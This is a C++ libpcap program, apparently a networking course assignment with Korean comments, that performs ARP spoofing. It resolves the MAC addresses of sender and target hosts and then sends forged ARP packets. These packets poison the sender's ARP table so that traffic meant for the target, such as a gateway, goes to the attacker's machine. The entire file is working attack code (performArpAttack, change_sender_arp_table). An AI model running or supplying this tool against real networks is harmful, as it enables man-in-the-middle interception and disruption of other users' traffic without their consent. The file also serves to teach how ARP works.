#include <iostream>

#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
using namespace std;

std::map<Ip, Mac> mac_cache;


void print_mac_address(const Mac& mac) { 	printf("%s\n", static_cast<std::string>(mac).c_str()); }

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
void find_my_ipmac(const char* dev, Ip *my_ip, Mac* my_mac){
	struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {
        perror("socket");
        return;
    }

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        // MAC 주소를 sender_mac 배열에 저장
        for (int i = 0; i < 6; ++i) {
			*my_mac = Mac(reinterpret_cast<uint8_t*>(s.ifr_addr.sa_data));
        }
    } else {
        perror("ioctl");
    }

	    // IP 주소 찾기
    if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
		*my_ip = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&s.ifr_addr)->sin_addr.s_addr));
    } else {
        perror("ioctl");
    }

    close(fd);
};

void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, const Mac& eth_target_mac, const Mac& arp_sender_mac, const Ip& sender_ip, const Mac& arp_target_mac, const Ip& target_ip){
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
	packet_send.arp_.op_ = htons(ArpHdr::Request);

	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;

	packet_send.eth_.dmac_ = eth_target_mac;
	packet_send.eth_.smac_ = eth_sender_mac;

	packet_send.arp_.smac_ = arp_sender_mac; 
	packet_send.arp_.sip_ = htonl(static_cast<uint32_t>(sender_ip)); 
	
	packet_send.arp_.tmac_ = arp_target_mac;
	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));

}

void change_sender_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){
	//printf("Sender IP Address: %s, Target IP Address: %s\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
	//printf("Sender MAC Address: ");
	//print_mac_address(sender_mac);

	EthArpPacket packet_send;
	
	const Mac& broadcast = Mac::broadcastMac();
    const Mac& zero = Mac::nullMac();
	make_send_packet(packet_send, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip);
	
	//send PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
};

int get_mac_address(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, Mac& dest_mac, const Ip& dest_ip){
	//printf("request (%s)'s MAC........\n", static_cast<std::string>(dest_ip).c_str());

	auto it = mac_cache.find(dest_ip);
    if (it != mac_cache.end()) {
        dest_mac = it->second;
		printf("(already in set) IP(%s) =>  ", static_cast<std::string>(dest_ip).c_str());
		print_mac_address(dest_mac);
        return 0;
    }

	EthArpPacket packet_send;
	
	const Mac& broadcast = Mac::broadcastMac();
    const Mac& zero = Mac::nullMac();
	make_send_packet(packet_send, my_mac, broadcast, my_mac,my_ip,   zero, dest_ip);
	
	//send ARP request PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return 1;
};

int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac, const Ip& gateway_ip, const Ip& sender_ip, const Ip& target_ip){
	int flag_send, status;//1: find sender mac
	//flag_send
	//1: find sender mac
	//2: find target mac
	//3: send arp table attack
	//4: let's start another attack
	Ip ip_of_new_addr, search_ip;
	Mac sender_mac, target_mac, new_mac_addr;

	printf("\n===========!ARP Table attctk Start!==================\n");

	printf("Sender IP Address: %s, ", static_cast<std::string>(sender_ip).c_str());
	printf("Target IP Address: %s\n", static_cast<std::string>(target_ip).c_str());

	EthArpPacket packet_send;
	struct pcap_pkthdr* header;
	int res;
	const u_char* packet_receive;
	
	flag_send=1;//now....
	status=1;

	while (1) {      
		if(status){//flag == 0: 수신만 기능
			if(flag_send==1){
				if(get_mac_address(handle,my_mac, my_ip, sender_mac, sender_ip)) {
					search_ip=sender_ip;
				}else{
					flag_send=2;
				}
			}
			if(flag_send==2){
				if(get_mac_address(handle,my_mac, my_ip, target_mac, target_ip)) {
					search_ip=target_ip;
				}else{
					flag_send=3;
				}
			} 
			if(flag_send==3){
				printf("Attack!!\n");
				change_sender_arp_table(handle,my_mac, sender_mac, target_ip, sender_ip);
				
				return 0;
				flag_send=4;
			} else if(flag_send==4){
				//another request...
				return 0;
			}
			status = 0;
		}

		
		res = pcap_next_ex(handle, &header, &packet_receive);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		//printf("%u bytes captured\n", header->caplen);
		struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
        if ((EAPacket->eth_.type() == EthHdr::Arp)&&(flag_send==1 || flag_send==2)) {
			ip_of_new_addr = EAPacket->arp_.sip();

            if ((EAPacket->arp_.op() == ArpHdr::Reply)&&(ip_of_new_addr==search_ip)) {//check ip too//&&(arp_hdr->ar_sip==sender_ip)
				
				new_mac_addr=EAPacket->arp_.smac();
            
                printf("IP(%s) =>  ", static_cast<std::string>(ip_of_new_addr).c_str());
                print_mac_address(new_mac_addr);
				// Update the MAC address cache
                mac_cache[ip_of_new_addr] = new_mac_addr;
				status=1;
				if(flag_send==1){sender_mac = new_mac_addr; flag_send=2;  continue;};
				if(flag_send==2){target_mac = new_mac_addr; flag_send=3;  continue;};
                //flag_send = 3;
            }
		}
	}
	pcap_close(handle);
	return 1;
}

int main(int argc, char* argv[]) {

	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	printf("argc: %d\n", argc);
	//총 (argc-2)/2번을 반복문 돌아야 함.

	Ip my_ip, sender_ip, target_ip, gateway_ip, ip_of_new_addr;
	Mac my_mac, sender_mac, target_mac, new_mac_addr;
	//타켓의 mac은 없어도 되지 않나?!?!?!?!

	//find_my_mac(dev, my_mac);
	printf("==============Basic Information================\n");
	find_my_ipmac(dev, &my_ip, &my_mac);
	printf("My IP Address: %s\n",  static_cast<std::string>(my_ip).c_str());
	printf("My Mac Address: ");
	print_mac_address(my_mac);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char buffer[INET_ADDRSTRLEN];
	for (int i=2; i<argc; i+=2){

		 sender_ip = Ip(argv[i]);
		 target_ip = Ip(argv[i+1]);
		//printf("Sender IP: %s Target IP: %s\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
		
		performArpAttack(handle, dev, my_ip, my_mac, gateway_ip, sender_ip, target_ip);
	}
}
